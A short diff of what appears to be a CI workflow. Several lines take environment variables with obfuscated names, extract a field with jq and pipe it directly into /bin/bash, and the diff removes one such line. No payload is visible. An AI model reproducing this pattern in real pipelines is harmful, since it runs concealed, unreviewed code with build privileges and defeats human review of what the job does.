@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$oquo41518" | jq -r .sv9221 | /bin/bash
           echo $ery11615 | jq -r .ndgr14045 | /bin/bash
           echo $uh74203 | jq -r .xjwf4 | /bin/bash
-          echo $rogh59 | jq -r .ctje5 | /bin/bash
 
       - name: Upload data
         if: always()
